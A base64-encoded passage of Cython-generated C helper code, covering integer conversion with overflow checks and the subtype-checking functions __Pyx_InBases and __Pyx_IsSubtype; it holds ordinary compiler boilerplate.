H1cbiAgICBpZiAoaXNfdW5zaWduZWQpIHtcbiNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFNcbiAgICAgICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5TG9uZ19Jc05lZyh4KSkpIHtcbiAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93O1xuICAgICAgICB9IGVsc2UgaWYgKF9fUHl4X1B5TG9uZ19Jc0NvbXBhY3QoeCkpIHtcbiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgX19QeXhfY29tcGFjdF91cHlsb25nLCBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlVW5zaWduZWQoeCkpXG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBjb25zdCBkaWdpdCogZGlnaXRzID0gX19QeXhfUHlMb25nX0RpZ2l0cyh4KTtcbiAgICAgICAgICAgIGFzc2VydChfX1B5eF9QeUxvbmdfRGlnaXRDb3VudCh4KSA+IDEpO1xuICAgICAgICAgICAgc3dpdGNoIChfX1B5eF9QeUxvbmdfRGlnaXRDb3VudCh4KSkge1xuICAgICAgICAgICAgICAgIGNhc2UgMjpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgPiAxICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMiAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIHVuc2lnbmVkIGxvbmcsICgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSA+PSAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKCgoKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIGNhc2UgMzpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIHVuc2lnbmVkIGxvbmcsICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpID49IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKCgoKChpbnQpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIGNhc2UgNDpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgPiAzICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gNCAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIHVuc2lnbmVkIGxvbmcsICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgPj0gNCAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoKCgoKCgoaW50KWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEMwMEE3XG4gICAgICAgIGlmICh1bmxpa2VseShQeV9TSVpFKHgpIDwgMCkpIHtcbiAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93O1xuICAgICAgICB9XG4jZWxzZVxuICAgICAgICB7XG4gICAgICAgICAgICBpbnQgcmVzdWx0ID0gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKHgsIFB5X0ZhbHNlLCBQeV9MVCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkocmVzdWx0IDwgMCkpXG4gICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpIC0xO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KHJlc3VsdCA9PSAxKSlcbiAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX25lZ19vdmVyZmxvdztcbiAgICAgICAgfVxuI2VuZGlmXG4gICAgICAgIGlmICgoc2l6ZW9mKGludCkgPD0gc2l6ZW9mKHVuc2lnbmVkIGxvbmcpKSkge1xuICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGludCwgdW5zaWduZWQgbG9uZywgUHlMb25nX0FzVW5zaWduZWRMb25nKHgpKVxuICAgICAgICB9IGVsc2UgaWYgKChzaXplb2YoaW50KSA8PSBzaXplb2YodW5zaWduZWQgUFlfTE9OR19MT05HKSkpIHtcbiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UX0VYQyhpbnQsIHVuc2lnbmVkIFBZX0xPTkdfTE9ORywgUHlMb25nX0FzVW5zaWduZWRMb25nTG9uZyh4KSlcbiAgICAgICAgfVxuICAgIH0gZWxzZSB7XG4jaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG4gICAgICAgIGlmIChfX1B5eF9QeUxvbmdfSXNDb21wYWN0KHgpKSB7XG4gICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIF9fUHl4X2NvbXBhY3RfcHlsb25nLCBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlKHgpKVxuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgY29uc3QgZGlnaXQqIGRpZ2l0cyA9IF9fUHl4X1B5TG9uZ19EaWdpdHMoeCk7XG4gICAgICAgICAgICBhc3NlcnQoX19QeXhfUHlMb25nX0RpZ2l0Q291bnQoeCkgPiAxKTtcbiAgICAgICAgICAgIHN3aXRjaCAoX19QeXhfUHlMb25nX1NpZ25lZERpZ2l0Q291bnQoeCkpIHtcbiAgICAgICAgICAgICAgICBjYXNlIC0yOlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiAxICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMiAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIGxvbmcsIC0obG9uZykgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKGludCktMSkqKCgoKChpbnQpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMF0pKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgY2FzZSAyOlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSA+IDEgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgdW5zaWduZWQgbG9uZywgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKCgoKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICBjYXNlIC0zOlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIGxvbmcsIC0obG9uZykgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoaW50KS0xKSooKCgoKCgoaW50KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMF0pKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgY2FzZSAzOlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAzICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgdW5zaWduZWQgbG9uZywgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoKCgoKChpbnQpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICBjYXNlIC00OlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiAzICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gNCAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIGxvbmcsIC0obG9uZykgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKChpbnQpLTEpKigoKCgoKCgoKGludClkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMF0pKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgY2FzZSA0OlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiA0ICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgdW5zaWduZWQgbG9uZywgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKCgoKCgoKCgoaW50KWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuI2VuZGlmXG4gICAgICAgIGlmICgoc2l6ZW9mKGludCkgPD0gc2l6ZW9mKGxvbmcpKSkge1xuICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGludCwgbG9uZywgUHlMb25nX0FzTG9uZyh4KSlcbiAgICAgICAgfSBlbHNlIGlmICgoc2l6ZW9mKGludCkgPD0gc2l6ZW9mKFBZX0xPTkdfTE9ORykpKSB7XG4gICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEMoaW50LCBQWV9MT05HX0xPTkcsIFB5TG9uZ19Bc0xvbmdMb25nKHgpKVxuICAgICAgICB9XG4gICAgfVxuICAgIHtcbiAgICAgICAgaW50IHZhbDtcbiAgICAgICAgaW50IHJldCA9IC0xO1xuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTYgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAgICAgUHlfc3NpemVfdCBieXRlc19jb3BpZWQgPSBQeUxvbmdfQXNOYXRpdmVCeXRlcyhcbiAgICAgICAgICAgIHgsICZ2YWwsIHNpemVvZih2YWwpLCBQeV9BU05BVElWRUJZVEVTX05BVElWRV9FTkRJQU4gfCAoaXNfdW5zaWduZWQgPyBQeV9BU05BVElWRUJZVEVTX1VOU0lHTkVEX0JVRkZFUiB8IFB5X0FTTkFUSVZFQllURVNfUkVKRUNUX05FR0FUSVZFIDogMCkpO1xuICAgICAgICBpZiAodW5saWtlbHkoYnl0ZXNfY29waWVkID09IC0xKSkge1xuICAgICAgICB9IGVsc2UgaWYgKHVubGlrZWx5KGJ5dGVzX2NvcGllZCA+IChQeV9zc2l6ZV90KSBzaXplb2YodmFsKSkpIHtcbiAgICAgICAgICAgIGdvdG8gcmFpc2Vfb3ZlcmZsb3c7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICByZXQgPSAwO1xuICAgICAgICB9XG4jZWxpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDAgJiYgIShDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgfHwgZGVmaW5lZChfUHlMb25nX0FzQnl0ZUFycmF5KVxuICAgICAgICBpbnQgb25lID0gMTsgaW50IGlzX2xpdHRsZSA9IChpbnQpKih1bnNpZ25lZCBjaGFyICopJm9uZTtcbiAgICAgICAgdW5zaWduZWQgY2hhciAqYnl0ZXMgPSAodW5zaWduZWQgY2hhciAqKSZ2YWw7XG4gICAgICAgIHJldCA9IF9QeUxvbmdfQXNCeXRlQXJyYXkoKFB5TG9uZ09iamVjdCAqKXgsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlcywgc2l6ZW9mKHZhbCksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpc19saXR0bGUsICFpc191bnNpZ25lZCk7XG4jZWxzZVxuICAgICAgICBQeU9iamVjdCAqdjtcbiAgICAgICAgUHlPYmplY3QgKnN0ZXB2YWwgPSBOVUxMLCAqbWFzayA9IE5VTEwsICpzaGlmdCA9IE5VTEw7XG4gICAgICAgIGludCBiaXRzLCByZW1haW5pbmdfYml0cywgaXNfbmVnYXRpdmUgPSAwO1xuICAgICAgICBpbnQgY2h1bmtfc2l6ZSA9IChzaXplb2YobG9uZykgPCA4KSA/IDMwIDogNjI7XG4gICAgICAgIGlmIChsaWtlbHkoUHlMb25nX0NoZWNrRXhhY3QoeCkpKSB7XG4gICAgICAgICAgICB2ID0gX19QeXhfTmV3UmVmKHgpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgdiA9IFB5TnVtYmVyX0xvbmcoeCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIXYpKSByZXR1cm4gKGludCkgLTE7XG4gICAgICAgICAgICBhc3NlcnQoUHlMb25nX0NoZWNrRXhhY3QodikpO1xuICAgICAgICB9XG4gICAgICAgIHtcbiAgICAgICAgICAgIGludCByZXN1bHQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZUJvb2wodiwgUHlfRmFsc2UsIFB5X0xUKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShyZXN1bHQgPCAwKSkge1xuICAgICAgICAgICAgICAgIFB5X0RFQ1JFRih2KTtcbiAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgLTE7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBpc19uZWdhdGl2ZSA9IHJlc3VsdCA9PSAxO1xuICAgICAgICB9XG4gICAgICAgIGlmIChpc191bnNpZ25lZCAmJiB1bmxpa2VseShpc19uZWdhdGl2ZSkpIHtcbiAgICAgICAgICAgIFB5X0RFQ1JFRih2KTtcbiAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93O1xuICAgICAgICB9IGVsc2UgaWYgKGlzX25lZ2F0aXZlKSB7XG4gICAgICAgICAgICBzdGVwdmFsID0gUHlOdW1iZXJfSW52ZXJ0KHYpO1xuICAgICAgICAgICAgUHlfREVDUkVGKHYpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFzdGVwdmFsKSlcbiAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgLTE7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBzdGVwdmFsID0gdjtcbiAgICAgICAgfVxuICAgICAgICB2ID0gTlVMTDtcbiAgICAgICAgdmFsID0gKGludCkgMDtcbiAgICAgICAgbWFzayA9IFB5TG9uZ19Gcm9tTG9uZygoMUwgPDwgY2h1bmtfc2l6ZSkgLSAxKTsgaWYgKHVubGlrZWx5KCFtYXNrKSkgZ290byBkb25lO1xuICAgICAgICBzaGlmdCA9IFB5TG9uZ19Gcm9tTG9uZyhjaHVua19zaXplKTsgaWYgKHVubGlrZWx5KCFzaGlmdCkpIGdvdG8gZG9uZTtcbiAgICAgICAgZm9yIChiaXRzID0gMDsgYml0cyA8IChpbnQpIHNpemVvZihpbnQpICogOCAtIGNodW5rX3NpemU7IGJpdHMgKz0gY2h1bmtfc2l6ZSkge1xuICAgICAgICAgICAgUHlPYmplY3QgKnRtcCwgKmRpZ2l0O1xuICAgICAgICAgICAgbG9uZyBpZGlnaXQ7XG4gICAgICAgICAgICBkaWdpdCA9IFB5TnVtYmVyX0FuZChzdGVwdmFsLCBtYXNrKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghZGlnaXQpKSBnb3RvIGRvbmU7XG4gICAgICAgICAgICBpZGlnaXQgPSBQeUxvbmdfQXNMb25nKGRpZ2l0KTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihkaWdpdCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoaWRpZ2l0IDwgMCkpIGdvdG8gZG9uZTtcbiAgICAgICAgICAgIHZhbCB8PSAoKGludCkgaWRpZ2l0KSA8PCBiaXRzO1xuICAgICAgICAgICAgdG1wID0gUHlOdW1iZXJfUnNoaWZ0KHN0ZXB2YWwsIHNoaWZ0KTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghdG1wKSkgZ290byBkb25lO1xuICAgICAgICAgICAgUHlfREVDUkVGKHN0ZXB2YWwpOyBzdGVwdmFsID0gdG1wO1xuICAgICAgICB9XG4gICAgICAgIFB5X0RFQ1JFRihzaGlmdCk7IHNoaWZ0ID0gTlVMTDtcbiAgICAgICAgUHlfREVDUkVGKG1hc2spOyBtYXNrID0gTlVMTDtcbiAgICAgICAge1xuICAgICAgICAgICAgbG9uZyBpZGlnaXQgPSBQeUxvbmdfQXNMb25nKHN0ZXB2YWwpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KGlkaWdpdCA8IDApKSBnb3RvIGRvbmU7XG4gICAgICAgICAgICByZW1haW5pbmdfYml0cyA9ICgoaW50KSBzaXplb2YoaW50KSAqIDgpIC0gYml0cyAtIChpc191bnNpZ25lZCA/IDAgOiAxKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShpZGlnaXQgPj0gKDFMIDw8IHJlbWFpbmluZ19iaXRzKSkpXG4gICAgICAgICAgICAgICAgZ290byByYWlzZV9vdmVyZmxvdztcbiAgICAgICAgICAgIHZhbCB8PSAoKGludCkgaWRpZ2l0KSA8PCBiaXRzO1xuICAgICAgICB9XG4gICAgICAgIGlmICghaXNfdW5zaWduZWQpIHtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSh2YWwgJiAoKChpbnQpIDEpIDw8IChzaXplb2YoaW50KSAqIDggLSAxKSkpKVxuICAgICAgICAgICAgICAgIGdvdG8gcmFpc2Vfb3ZlcmZsb3c7XG4gICAgICAgICAgICBpZiAoaXNfbmVnYXRpdmUpXG4gICAgICAgICAgICAgICAgdmFsID0gfnZhbDtcbiAgICAgICAgfVxuICAgICAgICByZXQgPSAwO1xuICAgIGRvbmU6XG4gICAgICAgIFB5X1hERUNSRUYoc2hpZnQpO1xuICAgICAgICBQeV9YREVDUkVGKG1hc2spO1xuICAgICAgICBQeV9YREVDUkVGKHN0ZXB2YWwpO1xuI2VuZGlmXG4gICAgICAgIGlmICh1bmxpa2VseShyZXQpKVxuICAgICAgICAgICAgcmV0dXJuIChpbnQpIC0xO1xuICAgICAgICByZXR1cm4gdmFsO1xuICAgIH1cbnJhaXNlX292ZXJmbG93OlxuICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19PdmVyZmxvd0Vycm9yLFxuICAgICAgICAidmFsdWUgdG9vIGxhcmdlIHRvIGNvbnZlcnQgdG8gaW50Iik7XG4gICAgcmV0dXJuIChpbnQpIC0xO1xucmFpc2VfbmVnX292ZXJmbG93OlxuICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19PdmVyZmxvd0Vycm9yLFxuICAgICAgICAiY2FuXCd0IGNvbnZlcnQgbmVnYXRpdmUgdmFsdWUgdG8gaW50Iik7XG4gICAgcmV0dXJuIChpbnQpIC0xO1xufVxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbnN0YXRpYyBpbnQgX19QeXhfSW5CYXNlcyhQeVR5cGVPYmplY3QgKmEsIFB5VHlwZU9iamVjdCAqYikge1xuICAgIHdoaWxlIChhKSB7XG4gICAgICAgIGEgPSBfX1B5eF9QeVR5cGVfR2V0U2xvdChhLCB0cF9iYXNlLCBQeVR5cGVPYmplY3QqKTtcbiAgICAgICAgaWYgKGEgPT0gYilcbiAgICAgICAgICAgIHJldHVybiAxO1xuICAgIH1cbiAgICByZXR1cm4gYiA9PSAmUHlCYXNlT2JqZWN0X1R5cGU7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfSXNTdWJ0eXBlKFB5VHlwZU9iamVjdCAqYSwgUHlUeXBlT2JqZWN0ICpiKSB7XG4gICAgUHlPYmplY3QgKm1ybztcbiAgICBpZiAoYSA9PSBiKSByZXR1cm4gMTtcbiAgICBtcm8gPSBhLT50cF9tcm87XG4gICAgaWYgKGxpa2VseShtcm8pKSB7XG4gICAgICAgIFB5X3NzaXplX3QgaSwgbjtcbiAgICAgICAgbiA9IFB5VHVwbGVfR0VUX1NJWkUobXJvKTtcbiAgICAgICAgZm9yIChpID0gMDsgaSA8IG47IGkrKykge1xuICAgICAgICAgICAgaWYgKFB5VHVwbGVfR0VUX0lURU0obXJvLCBpKSA9PSAoUHlPYmplY3QgKiliKVxuICAgICAgICAgICAgICAgIHJldHVybiAxO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybiAwO1xuICAgIH1cbiAgICByZXR1cm4gX19QeXhfSW5CYXNlcyhhLCBiKTtcbn1cbnN0YXR